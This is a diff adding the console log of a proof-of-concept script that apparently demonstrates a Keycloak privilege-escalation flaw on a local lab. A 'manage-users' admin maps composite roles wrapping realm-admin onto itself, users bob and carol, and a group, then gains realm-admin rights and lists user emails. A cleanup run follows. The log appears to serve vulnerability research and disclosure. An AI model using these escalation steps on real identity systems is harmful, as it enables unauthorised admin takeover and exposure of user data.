@@ -1,0 +1,84 @@
+$ ./poc/kc_composite_maprole_poc.sh all
+----------------------------------------------------------------
+[*] Target     : http://127.0.0.1:8080  (realm: app)
+[*] Attacker   : limited-admin (expected scope: manage-users)
+----------------------------------------------------------------
+[+] authenticated as limited-admin
+[*] Baseline: confirm attacker is genuinely low-priv (realm op should 403)
+[+] POST /roles (should be denied) -> HTTP 403 (want ^403$)
+[*] Signal 1: is the composite wrapper in the attacker's mappable list?
+[+] wrapper 'sneaky-composite' is listed as mappable by manage-users (id=df2d4ae1-1792-4aee-908f-0a757497aabd)
+[*] Signal 2 (decisive, reversible): map wrapper onto self, then UNMAP
+----------------------------------------------------------------
+[-] VULNERABLE: manage-users mapped a realm-admin-bearing composite (HTTP 204). Mapping rolled back.
+
+----------------------------------------------------------------
+[*] Target     : http://127.0.0.1:8080  (realm: app)
+[*] Attacker   : limited-admin (expected scope: manage-users)
+----------------------------------------------------------------
+[*] PRE-CHECK: attacker cannot create a realm role
+[+] POST /roles as limited-admin -> HTTP 403 (want ^403$)
+[*] ATTACK A: self-map composite 'sneaky-composite' (wraps realm-admin)
+[+] map sneaky-composite onto self -> HTTP 204 (want ^204$)
+[*] Minting a fresh token (old JWT lacks the new roles)...
+[*] POST-CHECK: same attacker, new token, now performs realm-admin ops
+[+] create realm role 'pwned-by-limited-admin-1792665531' -> HTTP 201 (want ^201$)
+[*] Enumerating realm users (confidentiality impact)...
+    - alice <alice@example.com>
+    - bob <bob@example.com>
+    - carol <carol@example.com>
+    - dave <dave@example.com>
+    - limited-admin <limited@example.com>
+----------------------------------------------------------------
+[-] ESCALATION CONFIRMED: limited-admin (manage-users) is now realm-admin.
+[!] Cleanup: remove mapping + role:
+    curl -X DELETE "http://127.0.0.1:8080/admin/realms/app/users/d828a595-2681-45e7-8697-afde80f56c09/role-mappings/realm" -H "Authorization: Bearer <admin>" -H "Content-Type: application/json" -d '[{"id":"df2d4ae1-1792-4aee-908f-0a757497aabd","name":"sneaky-composite"}]'
+    (and delete realm role: pwned-by-limited-admin-1792665531)
+
+----------------------------------------------------------------
+[*] Target     : http://127.0.0.1:8080  (realm: app)
+[*] Attacker   : limited-admin (expected scope: manage-users)
+----------------------------------------------------------------
+[*] ATTACK B: map nested wrapper 'outer-sneaky' (->sneaky-composite->realm-admin) onto bob
+[+] map outer-sneaky onto bob -> HTTP 204 (want ^204$)
+[+] bob creates a realm role (now admin) -> HTTP 201 (want ^201$)
+[+] nested composite escalation works — depth is not checked
+
+----------------------------------------------------------------
+[*] Target     : http://127.0.0.1:8080  (realm: app)
+[*] Attacker   : limited-admin (expected scope: manage-users)
+----------------------------------------------------------------
+[*] PRE: carol cannot create roles
+[+] carol POST /roles (pre) -> HTTP 403 (want ^403$)
+[*] ATTACK C: map client role 'spa/hidden-ra' (wraps realm-admin) onto carol
+[+] map spa/hidden-ra onto carol -> HTTP 204 (want ^204$)
+[+] carol creates a realm role (now admin) -> HTTP 201 (want ^201$)
+[+] client-role wrapper on a non-admin client escalates — name outside ALL_ROLES is enough
+
+----------------------------------------------------------------
+[*] Target     : http://127.0.0.1:8080  (realm: app)
+[*] Attacker   : limited-admin (expected scope: manage-users)
+----------------------------------------------------------------
+[*] PRE: existing member 'alice' cannot create roles
+[+] alice POST /roles (pre) -> HTTP 403 (want ^403$)
+[*] ATTACK D: map wrapper 'sneaky-composite' onto group 'helpdesk' (not a join)
+[+] map sneaky-composite onto group helpdesk -> HTTP 204 (want ^204$)
+[+] alice (existing member) creates a realm role (now admin) -> HTTP 201 (want ^201$)
+[*] CONTROL: joining a NEW member still fails (the 26.8.1 fix is intact)
+[!] attacker is already realm-admin (POST /roles=201) — join-control skipped; run 'attack-d' standalone on a fresh lab to see the 403.
+[+] every current member of a manageable group is escalated without any join
+
+$ ./poc/kc_composite_maprole_poc.sh cleanup
+----------------------------------------------------------------
+[*] Target     : http://127.0.0.1:8080  (realm: app)
+[*] Attacker   : limited-admin (expected scope: manage-users)
+----------------------------------------------------------------
+[*] Authenticating as admin (admin@master) to clean up...
+[+] removed escalating role mappings from limited-admin / bob / carol / group helpdesk
+[+] group 'helpdesk' membership reset to original (alice only)
+[*] deleted role pwned-by-limited-admin-1792665531
+[*] deleted role pwned-by-alice-via-group-1792665531
+[*] deleted role pwned-by-bob-nested-1792665531
+[*] deleted role pwned-by-carol-clientrole-1792665531
+----------------------------------------------------------------
+[+] cleanup complete — lab restored to pristine (payloads intact, escalations undone)
